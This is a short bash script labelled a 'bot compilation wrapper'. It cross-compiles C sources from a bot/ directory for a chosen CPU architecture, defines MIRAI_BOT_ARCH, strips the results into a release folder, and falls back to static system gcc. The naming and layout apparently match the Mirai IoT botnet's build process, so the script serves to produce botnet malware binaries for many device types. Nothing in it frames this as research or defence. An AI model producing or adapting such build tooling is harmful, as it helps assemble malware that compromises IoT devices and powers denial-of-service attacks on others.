#!/bin/bash

# Bot compilation wrapper script
ARCH=$1
OUTPUT=$2
FLAGS=$3

# Create a clean compilation environment
export CC="/etc/xcompiler/$ARCH/bin/$ARCH-gcc"
export STRIP="/etc/xcompiler/$ARCH/bin/$ARCH-strip"

# Compile with minimal flags to avoid conflicts
if [ -f "$CC" ]; then
    echo "Compiling $OUTPUT with $CC..."
    
    # Try with minimal flags first
    if $CC $FLAGS bot/*.c -std=c99 -O2 -o ~/release/"$OUTPUT" -DMIRAI_BOT_ARCH="$ARCH" 2>/dev/null; then
        echo "Successfully compiled $OUTPUT"
        if [ -f "$STRIP" ] && [ -f ~/release/"$OUTPUT" ]; then
            $STRIP ~/release/"$OUTPUT" 2>/dev/null
            echo "Successfully stripped $OUTPUT"
        fi
        exit 0
    else
        # Fallback to system gcc
        echo "Cross-compilation failed, trying system gcc..."
        gcc $FLAGS bot/*.c -std=c99 -O2 -static -o ~/release/"$OUTPUT" -DMIRAI_BOT_ARCH="$ARCH" 2>/dev/null
        if [ -f ~/release/"$OUTPUT" ]; then
            echo "Successfully compiled $OUTPUT with system gcc"
            exit 0
        else
            echo "Failed to compile $OUTPUT"
            exit 1
        fi
    fi
else
    echo "Compiler $CC not found"
    exit 1
fi
